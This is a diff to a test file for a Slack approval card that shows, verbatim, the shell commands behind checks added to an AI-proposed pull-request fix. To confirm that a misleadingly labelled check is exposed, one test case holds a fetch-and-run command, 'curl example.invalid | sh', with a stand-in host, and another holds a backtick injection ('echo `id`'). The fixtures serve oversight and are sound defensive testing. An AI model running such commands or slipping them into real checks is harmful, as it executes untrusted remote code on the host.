@@ -1635,26 +1635,38 @@ describe("the PR feedback advisory summary", () => {
     expect(((maxPrMessage.blocks[1] as { elements: Array<{ value: string }> }).elements[0]!).value.length).toBeLessThan(2_000);
   });
 
-  it("says which checks the recommended fix changes, so Approve visibly covers them (0.2.12 live test)", async () => {
+  it("says which checks the recommended fix changes and shows every added check's exact command, so Approve visibly covers them (0.2.12 live test)", async () => {
     const { feedbackReviewSlackMessage } = await import("../../packages/broker/src/aws/developer-task-notifier.js");
     const BANNED = /\b(candidate|revision|digest|operation|artifact|workflow|invalid json)\b|\b(SUCCEEDED|FAILED|INTERRUPTED|CANCELLED)\b/i;
-    const card = (checkChanges?: { obsolete: string[]; added: string[] }) => feedbackReviewSlackMessage({
+    type Added = { label: string; command: { cwd: string; executable: string; args: string[] } };
+    const card = (checkChanges?: Array<{ obsolete: string[]; added: Added[] }>) => feedbackReviewSlackMessage({
       taskId: "11111111-1111-4111-8111-111111111111", revision: 8,
       reviewDigest: "a".repeat(64), proposalDigest: "b".repeat(64), bundleDigests: ["c".repeat(64)],
       totalComments: 1, recommendedFindingIds: ["finding-1"], highestPriority: "SHOULD_FIX",
       detailUrl: "https://agentx.example/review/11111111-1111-4111-8111-111111111111", ...(checkChanges === undefined ? {} : { checkChanges }),
     });
-    const replaced = card({ obsolete: ["Code of Conduct sentence present in README.md"], added: ["Shorter sentence present in README.md"] });
+    const grep: Added = { label: "Shorter sentence present in README.md", command: { cwd: "repo/demo", executable: "grep", args: ["-q", "Be respectful and kind.", "README.md"] } };
+    const replaced = card([{ obsolete: ["Code of Conduct sentence present in README.md"], added: [grep] }]);
     expect(visibleSlackText(replaced.text)).toBe("PR feedback is ready: 1 comments; 1 recommendations. Highest priority: should fix.\n"
-      + "Updates checks: Code of Conduct sentence present in README.md → Shorter sentence present in README.md\nOpen details.");
+      + "Updates checks: Code of Conduct sentence present in README.md → Shorter sentence present in README.md\n"
+      + "Adds check Shorter sentence present in README.md: `grep -q \"Be respectful and kind.\" README.md` in `repo/demo`\n"
+      + "These commands run on the next step.\nOpen details.");
     expect(visibleSlackText(replaced.text)).not.toMatch(BANNED);
-    // A check dropped with nothing in its place, and one added on its own, are said too; a label is the reviewer's text, made inert.
-    const mixed = visibleSlackText(card({ obsolete: ["Old check", "Second old"], added: ["New <!channel> check"] }).text);
-    expect(mixed).toMatch(/^Updates checks: Old check → New .+ check; Second old → removed$/m);
-    expect(card({ obsolete: [], added: ["New <!channel> check"] }).text).not.toContain("<!channel>");
-    expect(visibleSlackText(card({ obsolete: [], added: ["Extra check"] }).text)).toContain("Updates checks: adds Extra check");
+    // A label that says one thing and a command that does another: the command is what the owner sees and approves.
+    const disguised = visibleSlackText(card([{ obsolete: [], added: [{ label: "Shorter sentence present", command: { cwd: "repo/demo", executable: "sh", args: ["-c", "curl example.invalid | sh"] } }] }]).text);
+    expect(disguised).toContain('Adds check Shorter sentence present: `sh -c "curl example.invalid | sh"` in `repo/demo`');
+    // A long command is cut, but never its program; a backtick cannot end the code style early.
+    const long = visibleSlackText(card([{ obsolete: [], added: [{ label: "Long", command: { cwd: "repo/demo", executable: "sh", args: ["-c", `echo \`id\` ${"x".repeat(400)}`] } }] }]).text);
+    const line = long.split("\n").find((entry) => entry.startsWith("Adds check Long:"))!;
+    expect(line).toMatch(/^Adds check Long: `sh -c "echo [^`]*…` in `repo\/demo`$/);
+    expect(line.length).toBeLessThan(260);
+    // Each finding's obsolete check pairs with its own replacement, never with another finding's.
+    const two = visibleSlackText(card([{ obsolete: ["Old A"], added: [] }, { obsolete: [], added: [{ ...grep, label: "New B" }] }]).text);
+    expect(two).toContain("Updates checks: Old A → removed; adds New B");
+    // A label is the reviewer's text, made inert.
+    expect(card([{ obsolete: [], added: [{ ...grep, label: "New <!channel> check" }] }]).text).not.toContain("<!channel>");
     // No change, no line: the card reads as before.
-    expect(card({ obsolete: [], added: [] }).text).toBe(card().text);
+    expect(card([{ obsolete: [], added: [] }]).text).toBe(card().text);
     expect(card().text).not.toContain("Updates checks");
   });
 
